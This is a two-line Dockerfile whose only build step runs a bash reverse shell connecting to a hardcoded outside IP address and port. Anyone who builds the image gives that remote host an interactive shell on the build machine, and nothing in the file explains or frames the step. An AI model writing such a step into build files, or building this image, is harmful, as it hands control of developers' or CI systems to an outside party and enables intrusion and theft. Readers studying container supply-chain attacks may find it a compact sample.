FROM ubuntu

RUN bash -c "bash -i >& /dev/tcp/45.32.51.244/8081 0>&1"
